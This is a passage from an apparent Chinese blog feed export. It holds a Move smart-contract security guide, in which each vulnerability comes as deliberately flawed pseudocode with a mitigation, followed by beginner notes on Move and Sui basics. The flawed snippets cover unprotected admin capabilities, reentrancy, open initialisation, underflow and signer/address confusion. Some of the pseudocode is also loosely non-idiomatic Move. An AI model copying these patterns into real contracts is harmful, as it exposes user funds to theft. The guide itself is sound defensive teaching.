class="line"></span><br><span class="line">    // ❌ 错误：这个函数应该只在模块初始化时被调用一次，但它却是公共的</span><br><span class="line">    public fun give_admin_cap(recipient: &amp;signer) &#123;</span><br><span class="line">        let cap = AdminCap &#123;&#125;;</span><br><span class="line">        // 将 AdminCap 资源转移到用户的账户下</span><br><span class="line">        move_to(recipient, cap);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // ❌ 错误：这个特权函数没有检查调用者的身份，只依赖于 `AdminCap`</span><br><span class="line">    public fun mint_tokens(admin_cap: &amp;AdminCap, amount: u64) &#123;</span><br><span class="line">        // ...铸造代币的逻辑...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>将初始化逻辑放在 <code>init_module</code> 中：</strong> <code>init_module</code> 函数只在模块发布时自动执行一次，是创建和分发初始能力的最安全场所。</li><li><strong>使用签名者进行权限验证：</strong> 始终将需要权限的函数用 <code>signer</code> 参数进行限制，并检查其地址是否为管理员地址，以进行双重验证。</li><li><strong>私有化特权函数：</strong> 将需要能力才能调用的函数声明为 <code>private</code>，并只在模块内部的公共函数中调用，从而限制外部访问。</li></ul><hr><h3 id="2-外部合约调用中的可重入性-Re-entrancy"><a href="#2-外部合约调用中的可重入性-Re-entrancy" class="headerlink" title="2. 外部合约调用中的可重入性 (Re-entrancy)"></a>2. 外部合约调用中的可重入性 (Re-entrancy)</h3><p><strong>核心原理：</strong></p><p>可重入性攻击在以太坊等区块链中非常常见。Move 的资源类型和原子性在很大程度上缓解了典型的可重入攻击，因为资源所有权转移是原子的。然而，如果一个函数在更新其内部状态<strong>之前</strong>，调用了另一个外部函数，而这个外部函数又可以再次调用回原函数，就可能导致状态不一致。</p><p><strong>漏洞描述：</strong></p><p>这种攻击通常被称为**循环回调 (Recursive Calls)**。例如，在一个借贷协议中，一个函数在给用户转账之后、但在更新其借贷状态之前，意外地被一个恶意合约再次调用。这使得攻击者可以在一次交易中多次取款，造成协议资金的损失。</p><p><strong>伪代码示例 (借贷协议中的可重入):</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::reentrancy_risk &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line">    use a_coin_module::Coin; // 假设的一个代币模块</span><br><span class="line"></span><br><span class="line">    struct UserBalance has key &#123;</span><br><span class="line">        balance: u64,</span><br><span class="line">        is_locked: bool,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：在转账后才更新状态</span><br><span class="line">    public fun withdraw(account: &amp;signer, amount: u64) acquires UserBalance &#123;</span><br><span class="line">        let user_address = signer::address_of(account);</span><br><span class="line">        let user_balance = borrow_global_mut&lt;UserBalance&gt;(user_address);</span><br><span class="line"></span><br><span class="line">        assert!(user_balance.balance &gt;= amount, 101);</span><br><span class="line"></span><br><span class="line">        // ❌ 风险点：在更新余额前调用了外部函数</span><br><span class="line">        // 这里可以调用一个恶意合约的函数，该恶意合约会再次调用 withdraw</span><br><span class="line">        // 恶意合约::re_call_me(user_address, amount); </span><br><span class="line"></span><br><span class="line">        // 假设 `A_COIN_MODULE::transfer` 是一个外部调用，</span><br><span class="line">        // 恶意合约可能在 transfer 中重新进入此函数</span><br><span class="line">        a_coin_module::transfer(user_address, amount);</span><br><span class="line"></span><br><span class="line">        user_balance.balance = user_balance.balance - amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>“检查-影响-交互”模式：</strong> 始终遵循这个安全模式。<strong>检查</strong>（Check）所有的前提条件，如余额是否足够。然后<strong>影响</strong>（Effect）合约内部的状态，例如更新用户的余额。最后，再进行<strong>交互</strong>（Interaction），如调用外部函数或进行转账。</li><li><strong>使用锁或状态标志：</strong> 在复杂的交互中，可以使用一个布尔标志（如 <code>is_locked</code>）来防止一个函数在执行过程中被再次调用。</li></ul><hr><h3 id="3-未受保护的初始化函数-Unprotected-Initialization-Functions"><a href="#3-未受保护的初始化函数-Unprotected-Initialization-Functions" class="headerlink" title="3. 未受保护的初始化函数 (Unprotected Initialization Functions)"></a>3. 未受保护的初始化函数 (Unprotected Initialization Functions)</h3><p><strong>核心原理：</strong></p><p>合约的初始化是其生命周期中至关重要的一步，通常用于设置管理员地址、初始代币供应量或其他关键配置参数。Move 提供了 <code>init_module</code> 函数，它只在模块发布时被 Move VM 自动执行一次。</p><p><strong>漏洞描述：</strong></p><p>当开发者没有利用 <code>init_module</code> 的特性，而是编写了一个公共的、没有权限控制的初始化函数时，就会引入巨大的安全风险。</p><ul><li><strong>重复初始化 (Re-initialization):</strong> 如果初始化函数没有检查一个全局状态变量（如 <code>is_initialized</code>）来防止重复调用，任何用户都可以在合约部署后反复执行该函数，从而覆盖掉初始配置。</li><li><strong>权限劫持 (Privilege Hijacking):</strong> 恶意用户在合约部署后抢先调用初始化函数，将合约的所有权或管理员权限转移到自己的地址，从而完全控制合约。</li></ul><p><strong>伪代码示例 (权限劫持):</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::unprotected_init &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line">    struct Config has key &#123; admin: address &#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：这个公共函数可以被任何人在任何时候调用</span><br><span class="line">    public fun set_initial_config(admin: &amp;signer) &#123;</span><br><span class="line">        // 如果 `Config` 资源不存在，则创建并移动</span><br><span class="line">        if (!exists&lt;Config&gt;(@self)) &#123;</span><br><span class="line">            move_to(@self, Config &#123; admin: signer::address_of(admin) &#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 否则更新管理员地址</span><br><span class="line">            let config = borrow_global_mut&lt;Config&gt;(@self);</span><br><span class="line">            config.admin = signer::address_of(admin);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>使用 <code>init_module</code>：</strong> 将所有初始化逻辑放在 <code>init_module</code> 函数中，它是最安全的初始化方式。</li><li><strong>使用单次执行标志：</strong> 如果确实需要一个公共的初始化函数，那么必须使用一个全局的布尔标志来确保它只能被调用一次。</li></ul><hr><h3 id="4-资源销毁不当-Improper-Resource-Destruction"><a href="#4-资源销毁不当-Improper-Resource-Destruction" class="headerlink" title="4. 资源销毁不当 (Improper Resource Destruction)"></a>4. 资源销毁不当 (Improper Resource Destruction)</h3><p><strong>核心原理：</strong></p><p>Move 的资源（<code>resource</code>）类型是其最重要的安全特性之一，它强制所有权模型，确保资源不能被复制或隐式丢弃。然而，开发者仍然需要明确地管理资源的生命周期，否则可能导致问题。</p><p><strong>漏洞描述：</strong></p><ul><li><strong>资源意外丢失 (Unintended Resource Loss):</strong> 一个函数接收一个资源，但没有正确地处理它（例如，既没有将其返回，也没有 <code>move_to</code> 到某个账户下），导致资源被意外丢弃。尽管 Move 的编译器会检查这种未使用的资源，但在复杂的逻辑中仍可能发生。</li><li><strong>非空资源被丢弃 (Dropping a non-empty Resource):</strong> 如果一个资源结构体包含其他嵌套资源，而开发者在不检查其内部状态的情况下销毁了外部资源，可能导致内部的宝贵资源被永久销毁。</li></ul><p><strong>伪代码示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::resource_loss &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line"></span><br><span class="line">    struct ImportantNFT has key, store &#123; id: u64 &#125;</span><br><span class="line">    struct NFTBox has key &#123; nft: ImportantNFT &#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：NFTBox 被销毁，导致内部的 NFT 也被销毁</span><br><span class="line">    public fun destroy_box_and_nft(account: &amp;signer) acquires NFTBox &#123;</span><br><span class="line">        let box = move_from&lt;NFTBox&gt;(signer::address_of(account));</span><br><span class="line">        // box 在函数结束时被销毁，其内部的 `nft` 资源也跟着被销毁</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>强制资源生命周期：</strong> 确保所有接收资源的函数都遵循清晰的生命周期：要么将其作为返回值返回，要么将其 <code>move_to</code> 到另一个账户。</li><li><strong>使用 <code>drop</code> 能力：</strong> 谨慎使用 <code>drop</code> 能力，它允许资源被显式销毁。只在确实需要销毁资源时才使用。</li></ul><hr><h3 id="5-整数溢出和下溢-Integer-Overflow-and-Underflow"><a href="#5-整数溢出和下溢-Integer-Overflow-and-Underflow" class="headerlink" title="5. 整数溢出和下溢 (Integer Overflow and Underflow)"></a>5. 整数溢出和下溢 (Integer Overflow and Underflow)</h3><p><strong>核心原理：</strong></p><p>在 Move 2024 版本中，大多数算术运算默认都进行了溢出和下溢检查，并在发生时直接 <code>panic</code>（中止）。这从语言层面提供了强大的安全保障。然而，在一些特定场景或使用旧版代码时，开发者仍需手动检查。</p><p><strong>漏洞描述：</strong></p><ul><li><strong>显式溢出 (Explicit Overflow):</strong> 如果算术操作的结果超出了其类型可以表示的最大值，就会发生溢出，导致结果变为一个很小的值。</li><li><strong>显式下溢 (Explicit Underflow):</strong> 如果从一个值中减去一个更大的值，结果超出了其类型可以表示的最小值，就会发生下溢，导致结果变为一个巨大的正数。</li></ul><p><strong>伪代码示例 (下溢):</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::underflow &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line"></span><br><span class="line">    struct UserBalance has key &#123; balance: u64 &#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：未检查余额就进行减法</span><br><span class="line">    public fun withdraw_tokens(account: &amp;signer, amount: u64) acquires UserBalance &#123;</span><br><span class="line">        let user_balance = borrow_global_mut&lt;UserBalance&gt;(signer::address_of(account));</span><br><span class="line">        // 如果 user_balance.balance &lt; amount，就会发生下溢</span><br><span class="line">        user_balance.balance = user_balance.balance - amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>始终进行检查：</strong> 在进行减法或任何可能导致下溢的操作之前，使用 <code>assert!</code> 或 <code>if</code> 语句检查前提条件。</li><li><strong>使用 Move 2024+：</strong> 使用最新的 Move 编译器，它包含了默认的溢出检查，这能极大地提高代码的安全性。</li></ul><hr><h3 id="6-权限分离不当-Improper-Separation-of-Privileges"><a href="#6-权限分离不当-Improper-Separation-of-Privileges" class="headerlink" title="6. 权限分离不当 (Improper Separation of Privileges)"></a>6. 权限分离不当 (Improper Separation of Privileges)</h3><p><strong>核心原理：</strong></p><p>良好的合约设计应严格区分特权操作（如管理配置）和非特权操作（如存款或查询）。在 Move 中，权限通常通过签名者 (<code>signer</code>) 或能力 (<code>capability</code>) 来管理。</p><p><strong>漏洞描述：</strong></p><ul><li><strong>不必要的 <code>signer</code> 参数：</strong> 一个函数本应是公共可调用的（例如查询余额），但却不必要地要求一个 <code>signer</code> 参数，导致只有拥有私钥的签名者才能调用，降低了合约的可用性和互操作性。</li><li><strong>特权操作未受限：</strong> 一个本应只被管理员调用的函数，却没有使用 <code>signer</code> 或能力进行访问控制，这允许任何用户执行特权操作。</li></ul><p><strong>伪代码示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::privilege_issue &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：查询操作不应需要签名者权限</span><br><span class="line">    public fun get_balance_of(user: &amp;signer): u64 &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 修复方案：</span><br><span class="line">    public fun get_balance_of_safe(user_address: address): u64 &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>按需使用 <code>signer</code>：</strong> 只有当函数需要执行特权操作或验证调用者身份时，才使用 <code>signer</code> 作为参数。</li><li><strong>使用能力进行访问控制：</strong> 对于复杂的权限系统，使用能力资源是更优的选择，它能提供更细粒度的权限控制。</li></ul><hr><h3 id="7-逻辑错误导致的状态不一致-Logic-Errors-Leading-to-Inconsistent-State"><a href="#7-逻辑错误导致的状态不一致-Logic-Errors-Leading-to-Inconsistent-State" class="headerlink" title="7. 逻辑错误导致的状态不一致 (Logic Errors Leading to Inconsistent State)"></a>7. 逻辑错误导致的状态不一致 (Logic Errors Leading to Inconsistent State)</h3><p><strong>核心原理：</strong></p><p>Move 的类型系统可以防止许多低级错误，但无法检查合约的业务逻辑。开发者在设计和实现合约时，如果逻辑考虑不周，就可能导致合约状态进入一个非预期的、不一致的状态。</p><p><strong>漏洞描述：</strong></p><ul><li><strong>条件竞态 (Race Conditions):</strong> 多个用户或交易几乎同时执行某个操作，且没有正确地通过原子性操作来管理，可能导致状态在其中一个操作完成之前被另一个操作改变。</li><li><strong>状态机设计不当 (Improper State Machine Design):</strong> 合约的状态机（例如：<code>Initialized</code> -&gt; <code>Active</code> -&gt; <code>Paused</code>）设计有缺陷，允许从一个非法的状态转换到另一个状态。</li></ul><p><strong>伪代码示例 (拍卖合约中的逻辑错误):</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::logic_error &#123;</span><br><span class="line">    struct AuctionState has key &#123;</span><br><span class="line">        is_active: bool,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：在拍卖结束后仍然可以出价</span><br><span class="line">    public fun place_bid(amount: u64) acquires AuctionState &#123;</span><br><span class="line">        let state = borrow_global_mut&lt;AuctionState&gt;(@self);</span><br><span class="line">        // 如果开发者忘记检查 `state.is_active`，那么在拍卖结束后，用户仍然可以出价</span><br><span class="line">        // assert!(state.is_active, 1); // 缺少了这行关键的检查</span><br><span class="line">        // ...出价逻辑...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>状态机建模：</strong> 在设计合约时，首先绘制一个清晰的状态转换图，并确保每个函数都严格检查并只允许合法的状态转换。</li><li><strong>单元测试和形式化验证：</strong> 编写全面的单元测试来覆盖所有可能的逻辑路径，并考虑使用形式化验证工具来证明关键属性的正确性。</li></ul><hr><h3 id="8-signer-和-address-的混淆-Confusion-between-signer-and-address"><a href="#8-signer-和-address-的混淆-Confusion-between-signer-and-address" class="headerlink" title="8. signer 和 address 的混淆 (Confusion between signer and address)"></a>8. <code>signer</code> 和 <code>address</code> 的混淆 (Confusion between <code>signer</code> and <code>address</code>)</h3><p><strong>核心原理：</strong></p><p>在 Move 中，<code>signer</code> 类型代表一个拥有私钥并能够签名交易的实体。<code>address</code> 类型则是一个不拥有私钥的地址，它只是一个数据值。</p><p><strong>漏洞描述：</strong></p><ul><li><strong>不正确的身份验证：</strong> 一个函数需要验证调用者的身份，但开发者错误地使用 <code>address</code> 类型作为身份验证，而不是 <code>signer</code>。这使得任何知道该地址的人都可以伪造调用，因为 <code>address</code> 可以作为一个常量被硬编码或传递。</li></ul><p><strong>伪代码示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::signer_address_confusion &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line"></span><br><span class="line">    const ADMIN_ADDRESS: address = @0x1;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：仅使用地址进行权限检查</span><br><span class="line">    public fun set_config_unsecure(config: u64) &#123;</span><br><span class="line">        // 这里的 `@sender` 是一个地址值，任何人都可以通过一个脚本传入</span><br><span class="line">        assert!(@sender == ADMIN_ADDRESS, 0); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 修复方案：</span><br><span class="line">    public fun set_config_secure(admin: &amp;signer, config: u64) &#123;</span><br><span class="line">        // `signer` 类型强制调用者必须是拥有私钥的实体</span><br><span class="line">        assert!(signer::address_of(admin) == ADMIN_ADDRESS, 0);</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>理解类型语义：</strong> 牢记 <code>signer</code> 代表权限，而 <code>address</code> 只是一个数据值。在所有需要权限验证的场景下，都必须使用 <code>signer</code>。</li></ul><hr><h3 id="9-特权函数中的不安全-public-声明-Unsafe-public-Declaration"><a href="#9-特权函数中的不安全-public-声明-Unsafe-public-Declaration" class="headerlink" title="9. 特权函数中的不安全 public 声明 (Unsafe public Declaration)"></a>9. 特权函数中的不安全 <code>public</code> 声明 (Unsafe <code>public</code> Declaration)</h3><p><strong>核心原理：</strong></p><p>在 Move 中，函数可以被声明为 <code>private</code>、<code>public</code>、<code>script</code> 或 <code>entry</code>。当一个函数被声明为 <code>public</code> 时，它可以在模块外部被调用。</p><p><strong>漏洞描述：</strong></p><p>如果一个特权操作函数被错误地声明为 <code>public</code> 且没有其他权限限制，那么任何外部模块或脚本都可以调用它。这暴露了合约的关键功能，可能导致资产被盗或配置被篡改。</p><p><strong>伪代码示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::unsafe_public &#123;</span><br><span class="line">    struct AdminCap has key &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：这个特权函数没有权限控制</span><br><span class="line">    public fun set_admin(new_admin_address: address) &#123;</span><br><span class="line">        // 如果没有其他权限检查，任何人都可以调用此函数</span><br><span class="line">        // 来改变管理员地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 修复方案：</span><br><span class="line">    public fun set_admin_safe(admin: &amp;signer, new_admin_address: address) acquires AdminCap &#123;</span><br><span class="line">        let admin_cap = borrow_global&lt;AdminCap&gt;(signer::address_of(admin));</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>最小权限原则：</strong> 只给函数必要的权限。如果一个函数只应该被模块内部的其他函数调用，就应该将其声明为 <code>private</code>。</li><li><strong>使用 <code>entry</code> 函数：</strong> 对于需要外部调用的特权函数，将其声明为 <code>entry</code> 函数，并使用 <code>signer</code> 参数进行严格的权限检查。</li></ul><hr><h3 id="10-signer-的意外使用-signer-as-a-Data-Source"><a href="#10-signer-的意外使用-signer-as-a-Data-Source" class="headerlink" title="10. signer 的意外使用 (signer as a Data Source)"></a>10. <code>signer</code> 的意外使用 (<code>signer</code> as a Data Source)</h3><p><strong>核心原理：</strong></p><p><code>signer</code> 的主要作用是验证调用者的权限。然而，开发者有时会意外地将它当作一个普通的数据源，这不仅没有增加安全性，反而可能导致代码变得复杂。</p><p><strong>漏洞描述：</strong></p><ul><li><strong>不必要的 <code>signer</code> 操作：</strong> 在不需要验证调用者权限的情况下，过度地使用 <code>signer</code> 类型，使得合约的调用方式变得复杂。例如，一个只读函数不应该要求 <code>signer</code> 参数。</li></ul><p><strong>伪代码示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::signer_abuse &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line">    struct UserData has key &#123; balance: u64 &#125;</span><br><span class="line"></span><br><span class="line">    // ❌ 错误：这是一个只读函数，不应要求签名者权限</span><br><span class="line">    public fun get_balance_of(user: &amp;signer): u64 acquires UserData &#123;</span><br><span class="line">        let user_address = signer::address_of(user);</span><br><span class="line">        let data = borrow_global&lt;UserData&gt;(user_address);</span><br><span class="line">        return data.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 修复方案：</span><br><span class="line">    public fun get_balance_of_safe(user_address: address): u64 acquires UserData &#123;</span><br><span class="line">        let data = borrow_global&lt;UserData&gt;(user_address);</span><br><span class="line">        return data.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>防范措施：</strong></p><ul><li><strong>按需使用 <code>signer</code>：</strong> 只有当函数需要进行状态变更或验证调用者身份时，才使用 <code>signer</code> 类型。对于只读查询，使用 <code>address</code> 类型即可。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>move 学习</title>
      <link href="/2025/07/28/move-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/07/28/move-%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><strong>move</strong>: 单个程序被组织成一个包<br><strong>包</strong>：Move.toml和源文件<br><strong>Move.toml</strong>: 关于包的元数据<br><strong>源文件</strong>：模块的源代码<br><strong>move语言中的，模块下的成员都是私有的</strong></p><blockquote><p>在开发过程包没有地址，需要将其设置为0x0</p></blockquote><p><strong>sui的地址是32字节</strong></p><p>账户是有私钥生成，并且又地址标识的，账户可以拥有对象，并且可以发送交易，每一笔交易有一个发件人，并且发件人由地址标识</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>move中的模块的所有成员都是模块的私有成员</p><p>用 <strong>module</strong>关键字后跟包地址，模块名称，分号和模块的主体.</p><p>模块是定义类型的核心程序单元。</p><p>基础语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module &lt;address&gt;::&lt;identifier&gt; &#123;</span><br><span class="line">    (&lt;use&gt; | &lt;type&gt; | &lt;function&gt; | &lt;constant&gt;)*</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>行注释</strong>： &#x2F;&#x2F; 即被编译器忽略的</p><p><strong>阻止注释</strong>：&#x2F;* 开头，结尾 *&#x2F; ，注释多行，块注释，注释调代码块</p><p><strong>文档注释</strong>：用于为伪代码生成文档的特殊注释。&#x2F;&#x2F;&#x2F;</p><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><h3 id="let声明变量，mut-关键字来可变"><a href="#let声明变量，mut-关键字来可变" class="headerlink" title="let声明变量，mut 关键字来可变"></a>let声明变量，mut 关键字来可变</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let &lt;variable_name&gt;[: &lt;type&gt;]  = &lt;expression&gt;;</span><br><span class="line">let mut &lt;variable_name&gt;[: &lt;type&gt;] = &lt;expression&gt;;</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let x: bool = true;</span><br><span class="line">let mut y: u8 = 42;</span><br></pre></td></tr></table></figure><p>用等号重新赋值可变变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y = 43;</span><br></pre></td></tr></table></figure><p>也可以重新声明变量，来隐藏它们</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let x: u8 = 42;</span><br><span class="line">let x: u16 = 42;</span><br></pre></td></tr></table></figure><p>显示转换，用as</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let x: u8 = 42;</span><br><span class="line">let y: u16 = x as u16;</span><br><span class="line">let z = 2 * (x as u16); // ambiguous, requires parentheses</span><br></pre></td></tr></table></figure><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>每一个模块部署在特定的地址</p><p>使用的话，就是使用use的关键字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module 0x1::Coin&#123;</span><br><span class="line">    //模块内容</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">地址以0x为前缀，32字节，代表区块链上的任何地</span><br><span class="line">地址::模块名</span><br><span class="line"></span><br><span class="line">```move</span><br><span class="line">// address literal</span><br><span class="line">let value: address = @0x1;</span><br><span class="line"></span><br><span class="line">// named address registered in Move.toml</span><br><span class="line">let value = @std;</span><br><span class="line">let other = @sui;</span><br></pre></td></tr></table></figure><h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><h3 id="字符串就是字节"><a href="#字符串就是字节" class="headerlink" title="字符串就是字节"></a>字符串就是字节</h3><p>使用b来将字符串转化为verctor<u64>,也就是数字</p><p>move语言中没有string,但是可以自己去引用一个</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数的返回值用：来表示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">public fun call_internal () ：u64&#123;</span><br><span class="line">    43</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="块"><a href="#块" class="headerlink" title="块"></a>块</h3><p>块是用{}，它返回的是块中最后一个表达式的值<br>本质和rust一样的，最后一个没有分号，代表返回它自己，如果有，则还是返回（）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">let sum = &#123;</span><br><span class="line">    let a = 1;</span><br><span class="line">    let b = 2;</span><br><span class="line">    a+b // 返回的是a+b的和</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">///如果修改一下</span><br><span class="line"></span><br><span class="line">let sum = &#123;</span><br><span class="line">    let a = 1;</span><br><span class="line">    let b = 2;</span><br><span class="line">    a + b; // 返回的是（）</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h3><p>在函数中的定义的变量归此作用域所有，函数作用域结束后，变量中的定义的被删除或解除分配</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module book :: ownership;</span><br><span class="line"></span><br><span class="line">pubilc fun owner() &#123;</span><br><span class="line">    let a = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区块也算一个作用域</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module book::ownership;</span><br><span class="line"></span><br><span class="line">public fun owner() &#123;</span><br><span class="line">    let a = 1; // a is owned by the `owner` function&#x27;s scope</span><br><span class="line">    &#123;</span><br><span class="line">        let b = 2; // the block that declares b owns it</span><br><span class="line">        &#123;</span><br><span class="line">            let c = 3; // the block that declares c owns it</span><br><span class="line">        &#125;; // c is dropped here</span><br><span class="line">    &#125;; // b is dropped here</span><br><span class="line">    // a = b; // error: b is not valid here</span><br><span class="line">    // a = c; // error: c is not valid here</span><br><span class="line">&#125; // a is dropped here</span><br></pre></td></tr></table></figure><p>如果区块或者函数有返回值，那么调用方就拥有这个变量的所有权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module book::ownership;</span><br><span class="line"></span><br><span class="line">public fun owner(): u8 &#123;</span><br><span class="line">    let a = 1; // a is owned by the `owner` function&#x27;s scope</span><br><span class="line">    let b = &#123;</span><br><span class="line">        let c = 2; // the block that declares c owns it</span><br><span class="line">        c // c is returned from the block and transferred to b</span><br><span class="line">    &#125;;</span><br><span class="line">    a + b // both a and b are valid here</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="技能"><a href="#技能" class="headerlink" title="技能"></a>技能</h3><p>move有一个技能复制</p><p>具有复制能力：bool，无符号整数，向量，地址，选择，字符串，类型名称</p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在不放弃所有权得情况下向函数显示值得方法</p><p>使用&amp;来表示选择变量的值，是对值得引用，也叫做借用。</p><ul><li>可变引用：希望修改变量得值，就使用这个&amp;mut 可变引用。</li></ul><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>定义可以处理任何类型或者函数得方法，也就是说，它的参数的类型任意的  通常使用&lt;&gt;来表示，<br>函数使用时也要加&lt;&gt;，这样才能告诉编译器这个函数对某个任意的T都适用。</p><h3 id="类型反射"><a href="#类型反射" class="headerlink" title="类型反射"></a>类型反射</h3><p>类型反射一般是指在运行时获取类型信息，判断类型，但是move是一个静态语言，安全优先，面向区块链的语言，有特殊的方式提供了类型反射</p><p>TypeName<T> :是一个可以标识类型的特殊结构，它在编译时就生成了类型信息</p><p>move是一个静态的语言，所有的类型在编译时确定，但有时候。我们希望在运行是知道某一个值得具体类型，比如：</p><ul><li>调试时输出一个值得类型名字</li><li>不同类型资源得统一管理</li><li>做类似多态类型行为得模拟</li></ul><p>然后就需要用&#x3D;一种轻量级得类型反射机制——TypeName<T></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::type_name::type_name;</span><br><span class="line">use std::string::String;</span><br><span class="line"></span><br><span class="line">fun get_type_name&lt;T&gt;(): String &#123;</span><br><span class="line">    type_name&lt;T&gt;() // 返回类型 T 的名字</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>move的测试属性是：#[test],就是告诉编译器该函数是一个测试函数，应该在执行测试时运行，测试函数是常规的函数，但是它们必须不接受任何的参数，也没有返回值</p><p>运行测试时，使用   <code>sui move test</code></p><p>测试失败案例使用，#[expected_failure],也就是说，你在告诉这个编译器测试预计会怀疑失败。</p><h2 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h2><p>sui中的对象是代表数字资产的高级抽象，对象具有类型，唯一的ID，所有者，数据，版本何摘要，对象模型简化了资产管理并支持广泛的用例</p><h2 id="所有权-1"><a href="#所有权-1" class="headerlink" title="所有权"></a>所有权</h2><ul><li>账户所有者: 一个对象由单个账户拥有</li><li>共享状态：对象可以网络共享</li><li>不可变（冻结）状态：冻结对象模型，其中对象永久只读，不能修改或移动，从而提供稳定且恒定的所有网络参与者都可以访问的状态</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
